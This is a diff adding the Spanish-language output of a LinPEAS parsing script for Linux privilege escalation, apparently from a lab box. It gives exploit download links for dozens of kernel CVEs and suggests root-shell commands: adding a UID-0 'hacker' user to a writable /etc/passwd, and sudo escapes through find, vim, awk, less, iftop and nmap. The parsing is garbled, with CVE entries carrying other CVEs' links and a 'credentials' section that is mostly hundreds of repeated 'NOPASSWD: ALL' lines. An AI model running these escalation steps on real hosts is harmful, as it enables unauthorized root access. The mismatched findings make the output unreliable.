@@ -1,0 +1,2802 @@
+╔════════════════════════════════════════════════════════════════╗                                             
+║             LinPEAS Output Parser & Analyzer                   ║                                             
+║         Script de Pentesting para Escalada de Privilegios      ║                                             
+║                                                                ║                                             
+║    USO EXCLUSIVO EN ENTORNOS CONTROLADOS Y AUTORIZADOS         ║                                             
+╚════════════════════════════════════════════════════════════════╝                                             
+                                                                                                               
+
+[+] Archivo encontrado: outputLP.txt
+
+[*] Iniciando análisis...
+
+╔════════════════════════════════════════════════════════════════╗
+║                    CVEs POTENCIALES                            ║
+╚════════════════════════════════════════════════════════════════╝
+
+[+] CVEs encontrados:
+
+  → CVE-2010-0832
+       Details: https://www.exploit-db.com/exploits/14339/
+       Tags: ubuntu=9.10|10.04
+       Download URL: https://www.exploit-db.com/download/14339
+
+  → CVE-2010-1146
+       Details: https://jon.oberheide.org/blog/2010/04/10/reiserfs-reiserfs_priv-vulnerability/
+       Tags: ubuntu=9.10
+       Download URL: https://jon.oberheide.org/files/team-edward.py
+
+  → CVE-2010-2959
+       Details: https://www.exploit-db.com/exploits/14814/
+       Tags: ubuntu=10.04{kernel:2.6.32-24-generic}
+       Download URL: https://www.exploit-db.com/download/14814
+
+  → CVE-2010-3081
+       Details: https://www.exploit-db.com/exploits/15024/
+       Tags: RHEL=5
+       Download URL: https://www.exploit-db.com/download/15024
+
+  → CVE-2010-3301
+       Details: https://www.exploit-db.com/exploits/15023/
+       Tags: debian=6.0{kernel:2.6.(32|33|34|35)-(1|2|trunk)-amd64},ubuntu=(10.04|10.10){kernel:2.6.(32|35)-(19|21|24)-server}
+       Download URL: https://www.exploit-db.com/download/15023
+
+  → CVE-2010-3437
+       Details: https://www.exploit-db.com/exploits/15150/
+       Tags: ubuntu=10.04
+       Download URL: https://www.exploit-db.com/download/15150
+
+  → CVE-2010-3848
+       Details: https://www.exploit-db.com/exploits/17787/
+       Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
+       Download URL: https://www.exploit-db.com/download/17787
+
+  → CVE-2010-3849
+       Details: http://vulnfactory.org/exploits/full-nelson.c
+       Tags: ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}
+       Download URL: http://vulnfactory.org/exploits/full-nelson.c
+
+  → CVE-2010-3850
+       Details: http://vulnfactory.org/exploits/full-nelson.c
+       Tags: ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}
+       Download URL: http://vulnfactory.org/exploits/full-nelson.c
+       Details: https://www.exploit-db.com/exploits/17787/
+       Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
+       Download URL: https://www.exploit-db.com/download/17787
+
+  → CVE-2010-3904
+       Details: http://www.securityfocus.com/archive/1/514379
+       Tags: debian=6.0{kernel:2.6.(31|32|34|35)-(1|trunk)-amd64},ubuntu=10.10|9.10,fedora=13{kernel:2.6.33.3-85.fc13.i686.PAE},ubuntu=10.04{kernel:2.6.32-(21|24)-generic}
+       Download URL: http://web.archive.org/web/20101020044048/http://www.vsecurity.com/download/tools/linux-rds-exploit.c
+
+  → CVE-2010-4073
+       Details: https://www.exploit-db.com/exploits/17787/
+       Tags: ubuntu=(10.04|9.10){kernel:2.6.(31|32)-(14|21)-server}
+       Download URL: https://www.exploit-db.com/download/17787
+
+  → CVE-2010-4347
+       Details: https://www.exploit-db.com/exploits/15774/
+       Download URL: https://www.exploit-db.com/download/15774
+
+  → CVE-2011-1485
+
+  → CVE-2012-0056
+       Details: http://vulnfactory.org/exploits/full-nelson.c
+       Tags: ubuntu=(9.10|10.10){kernel:2.6.(31|35)-(14|19)-(server|generic)},ubuntu=10.04{kernel:2.6.32-(21|24)-server}
+       Download URL: http://vulnfactory.org/exploits/full-nelson.c
+
+  → CVE-2013-0268
+       Details: https://www.exploit-db.com/exploits/27297/
+       Download URL: https://www.exploit-db.com/download/27297
+
+  → CVE-2013-2094
+       Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
+       Tags: RHEL=6
+       Download URL: https://www.exploit-db.com/download/25444
+       Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
+       Tags: RHEL=6,ubuntu=12.04{kernel:3.2.0-(23|29)-generic},fedora=16{kernel:3.1.0-7.fc16.x86_64},fedora=17{kernel:3.3.4-5.fc17.x86_64},debian=7{kernel:3.2.0-4-amd64}
+       Download URL: https://www.exploit-db.com/download/26131
+       Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
+       Tags: ubuntu=12.04{kernel:3.(2|5).0-(23|29)-generic}
+       Download URL: https://cyseclabs.com/exploits/vnik_v1.c
+
+  → CVE-2014-0196
+       Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
+       Download URL: https://www.exploit-db.com/download/33516
+
+  → CVE-2016-1247
+       Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+       Tags: debian=8,ubuntu=14.04|16.04|16.10
+       Download URL: https://legalhackers.com/exploits/CVE-2016-1247/nginxed-root.sh
+       Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
+
+  → CVE-2016-5195
+       Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+       Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
+       Download URL: https://www.exploit-db.com/download/40611
+       Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+       Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+       Download URL: https://www.exploit-db.com/download/40839
+
+  → CVE-2016-6662
+       Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
+       Tags: ubuntu=16.04.1
+       Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
+
+  → CVE-2016-6663
+       Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
+       Tags: ubuntu=16.04.1
+       Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
+       Details: https://legalhackers.com/advisories/Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.html
+
+  → CVE-2016-6664
+       Details: https://legalhackers.com/advisories/MySQL-Maria-Percona-PrivEscRace-CVE-2016-6663-5616-Exploit.html
+       Tags: ubuntu=16.04.1
+       Download URL: http://legalhackers.com/exploits/CVE-2016-6663/mysql-privesc-race.c
+
+  → CVE-2017-0358
+       Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1072
+       Tags: ubuntu=16.04{ntfs-3g:2015.3.14AR.1-1build1},debian=7.0{ntfs-3g:2012.1.15AR.5-2.1+deb7u2},debian=8.0{ntfs-3g:2014.2.15AR.2-1+deb8u2}
+       Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/41356.zip
+
+  → CVE-2017-1000366
+       Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+       Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
+       Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
+
+  → CVE-2017-1000379
+       Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
+       Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
+       Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
+
+  → CVE-2017-6074
+       Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
+       Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
+       Download URL: https://www.exploit-db.com/download/41458
+
+  → CVE-2018-1000001
+       Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
+       Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
+       Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
+
+  → CVE-2019-13272
+
+  → CVE-2019-18634
+       Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+       Tags: mint=19
+       Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
+
+  → CVE-2021-22555
+       Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+       Tags: ubuntu=20.04{kernel:5.8.0-*}
+       Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
+       Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
+
+  → CVE-2021-3156
+       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+       Tags: mint=19,ubuntu=18|20, debian=10
+       Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main
+       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+       Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
+       Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
+       Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
+
+  → CVE-2021-4034
+       Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+       Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
+       Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+       Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
+
+  → CVE-2022-32250
+       Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
+       Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
+       Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
+       Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+
+  → CVE-2025-38352
+
+
+╔════════════════════════════════════════════════════════════════╗
+║          ARCHIVOS/DIRECTORIOS ESCRIBIBLES (NO ROOT)            ║
+╚════════════════════════════════════════════════════════════════╝
+
+[i] Usuario actual: user
+
+[+] Archivos y directorios escribibles (no propiedad de root):
+
+  → /etc/exports
+  → /etc/init.d/rc.local
+  → /etc/passwd
+  → /etc/shadow
+  → /home/user
+  → /tmp
+  → /tmp/.ICE-unix
+  → /tmp/keyring-Dwc8oa
+  → /tmp/orbit-user
+  → /tmp/orbit-user/bonobo-activation-register-c8c2f4f48829d732fe60c7ca00000017.lock
+  → /tmp/orbit-user/bonobo-activation-server-c8c2f4f48829d732fe60c7ca00000017-ior
+  → /tmp/seahorse-tHKb20
+  → /tmp/ssh-TeWeEb3008
+  → /tmp/virtual-user.CiwXE6
+  → /tmp/.X11-unix
+  → /usr/local/bin/overwrite.sh
+  → /var/cache/gdm/user
+  → /var/cache/gdm/user/dmrc
+  → /var/lock
+  → /var/tmp
+  → /usr/local/bin/compress.sh
+  → /usr/bin/amuFormat.sh
+  → /usr/bin/gettext.sh
+  → /initrd.img
+  → /vmlinuz
+  → /.ssh
+  → /selinux
+  → /var/log/auth.log
+  → /var/log/syslog
+  → /var/log/ConsoleKit/history
+  → /var/run/ConsoleKit/database
+  → /tmp/backup.tar.gz
+  → /home/user/.local/share/gvfs-metadata/home
+  → /home/user/.local/share/gvfs-metadata/home-931f2bd7.log
+  → /var/www/html/index.nginx-debian.html
+  → /var/www/index.html
+  → /usr/sbin/remove-shell
+  → /usr/sbin/locale-gen
+  → /usr/sbin/exim_tidydb.O
+  → /usr/sbin/exipick.O
+  → /usr/sbin/update-locale
+  → /usr/sbin/modem-manager
+  → /usr/sbin/saned
+  → /usr/sbin/exim_fixdb
+  → /usr/sbin/laptop-detect
+  → /usr/sbin/update-initramfs
+  → /usr/sbin/a2enmod
+  → /usr/sbin/update-catalog
+  → /usr/local/bin/compress.sh
+  → /usr/bin/amuFormat.sh
+  → /usr/bin/gettext.sh
+  → /initrd.img
+  → /vmlinuz
+  → /.ssh
+  → /selinux
+  → /var/log/auth.log
+  → /var/log/syslog
+  → /var/log/ConsoleKit/history
+  → /var/run/ConsoleKit/database
+  → /tmp/backup.tar.gz
+  → /tmp/rootbash
+  → /home/user/.local/share/gvfs-metadata/home
+  → /home/user/.local/share/gvfs-metadata/home-931f2bd7.log
+
+╔════════════════════════════════════════════════════════════════╗
+║              PERMISOS EN DIRECTORIOS CRÍTICOS                  ║
+╚════════════════════════════════════════════════════════════════╝
+
+[+] Verificando permisos críticos:
+
+  [!] CRÍTICO: Tienes permisos de ESCRITURA en /etc/passwd
+  [*] Comando sugerido:
+      openssl passwd "tucontraseña"
+      Luego añade una línea como:
+      hacker:PASSWORD_GENERADO:0:0:root:/root:/bin/bash
+
+
+[+] Scripts .sh en directorios importantes:
+
+  → * * * * * root /usr/local/bin/compress.sh
+  → /usr/local/bin/overwrite.sh
+  → -rwxr--rw- 1 root staff 62 Jan 20 19:30 /usr/local/bin/overwrite.sh
+  → /usr/local/bin/compress.sh
+  → /usr/bin/amuFormat.sh
+  → /usr/bin/gettext.sh
+
+╔════════════════════════════════════════════════════════════════╗
+║                    PERMISOS SUDO                               ║
+╚════════════════════════════════════════════════════════════════╝
+
+[+] Permisos sudo encontrados:
+
+  (root) NOPASSWD: /usr/sbin/iftop
+    [!] ESCALADA POSIBLE CON IFTOP:
+      sudo iftop
+      Luego presiona: ! y ejecuta /bin/sh
+
+  (root) NOPASSWD: /usr/bin/find
+    [!] ESCALADA POSIBLE CON FIND:
+      sudo find . -exec /bin/sh \; -quit
+
+  (root) NOPASSWD: /usr/bin/nano
+  (root) NOPASSWD: /usr/bin/vim
+    [!] ESCALADA POSIBLE CON VIM:
+      sudo vim -c ':!/bin/sh'
+      O dentro de vim: :set shell=/bin/sh | :shell
+
+  (root) NOPASSWD: /usr/bin/man
+  (root) NOPASSWD: /usr/bin/awk
+    [!] ESCALADA POSIBLE CON AWK:
+      sudo awk 'BEGIN {system("/bin/sh")}'
+
+  (root) NOPASSWD: /usr/bin/less
+    [!] ESCALADA POSIBLE CON LESS/MORE:
+      sudo less /etc/profile
+      Luego presiona: !/bin/sh
+
+  (root) NOPASSWD: /usr/bin/ftp
+  (root) NOPASSWD: /usr/bin/nmap
+    [!] ESCALADA POSIBLE CON NMAP:
+      echo 'os.execute("/bin/sh")' > /tmp/x.nse
+      sudo nmap --script=/tmp/x.nse
+
+  (root) NOPASSWD: /usr/sbin/apache2
+  (root) NOPASSWD: /bin/more
+    [!] ESCALADA POSIBLE CON LESS/MORE:
+      sudo less /etc/profile
+      Luego presiona: !/bin/sh
+
+  (ALL) NOPASSWD: ALL
+  (ALL) NOPASSWD: ALL
+  (ALL) NOPASSWD: ALL
+
+╔════════════════════════════════════════════════════════════════╗
+║                  ARCHIVOS INTERESANTES                         ║
+╚════════════════════════════════════════════════════════════════╝
+
+[+] Scripts y archivos con permisos especiales:
+
+  → You can write script: /usr/local/bin/overwrite.sh
+  → * * * * * root /usr/local/bin/compress.sh
+  → /usr/local/bin/overwrite.sh
+  → -rwxr--rw- 1 root staff 62 Jan 20 19:30 /usr/local/bin/overwrite.sh
+  → You can write script: /usr/local/bin/overwrite.sh
+  → /usr/local/bin/compress.sh
+  → /usr/bin/amuFormat.sh
+  → /usr/bin/gettext.sh
+
+╔════════════════════════════════════════════════════════════════╗
+║              PASSWORDS Y CREDENCIALES ENCONTRADAS              ║
+╚════════════════════════════════════════════════════════════════╝
+
+[!] POSIBLES CREDENCIALES ENCONTRADAS:
+
+  → Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass
+  → Comments: No SMEP/SMAP bypass
+  → Comments: No SMEP/SMAP bypass
+  → gdm-password Not Found
+  → -rwxr-xr-x   1 root root   249 Feb 15  2011 passwd
+  → (root) NOPASSWD: /usr/sbin/iftop
+  → (root) NOPASSWD: /usr/bin/find
+  → (root) NOPASSWD: /usr/bin/nano
+  → (root) NOPASSWD: /usr/bin/vim
+  → (root) NOPASSWD: /usr/bin/man
+  → (root) NOPASSWD: /usr/bin/awk
+  → (root) NOPASSWD: /usr/bin/less
+  → (root) NOPASSWD: /usr/bin/ftp
+  → (root) NOPASSWD: /usr/bin/nmap
+  → (root) NOPASSWD: /usr/sbin/apache2
+  → (root) NOPASSWD: /bin/more
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
+  → (ALL) NOPASSWD: ALL
